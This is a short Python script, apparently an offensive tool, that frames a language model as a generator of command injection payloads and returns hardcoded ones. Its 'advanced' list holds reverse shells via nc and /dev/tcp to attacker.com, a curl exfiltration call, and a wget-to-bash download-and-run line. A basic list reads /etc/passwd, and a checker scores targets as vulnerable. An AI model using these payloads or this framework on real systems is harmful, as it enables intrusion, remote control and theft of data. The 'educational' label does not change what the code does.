import openai
import requests
import json
import time
from datetime import datetime

class GPTCommandInjectionFramework:
    def __init__(self, api_key=None):
        # Using a local GPT alternative for educational purposes
        self.base_url = "http://localhost:1234/v1"
        self.headers = {"Content-Type": "application/json"}
        
    def generate_payload(self, target_info, injection_type="basic"):
        prompt = f"""
        Generate command injection payloads for testing purposes only.
        Target info: {target_info}
        Injection type: {injection_type}
        
        Provide 5 different payload variations in JSON format:
        {{"payloads": ["payload1", "payload2", ...]}}
        """
        
        # Simulate GPT response for educational purposes
        payloads = {
            "basic": [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "; id",
                "| ps aux"
            ],
            "advanced": [
                "; curl http://attacker.com/$(whoami)",
                "| nc -e /bin/bash attacker.com 4444",
                "&& python3 -c 'import os; os.system(\"id\")'",
                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                "| wget -O- http://attacker.com/script.sh | bash"
            ]
        }
        
        return payloads.get(injection_type, payloads["basic"])
    
    def analyze_response(self, response_text):
        indicators = [
            "root:", "uid=", "gid=", "/bin/bash", "/home/",
            "total ", "drwx", "-rw-", "Permission denied"
        ]
        
        found_indicators = []
        for indicator in indicators:
            if indicator in response_text:
                found_indicators.append(indicator)
        
        return {
            "vulnerable": len(found_indicators) > 0,
            "indicators": found_indicators,
            "confidence": min(len(found_indicators) * 20, 100)
        }

if __name__ == "__main__":
    framework = GPTCommandInjectionFramework()
    print("GPT Command Injection Framework initialized successfully")
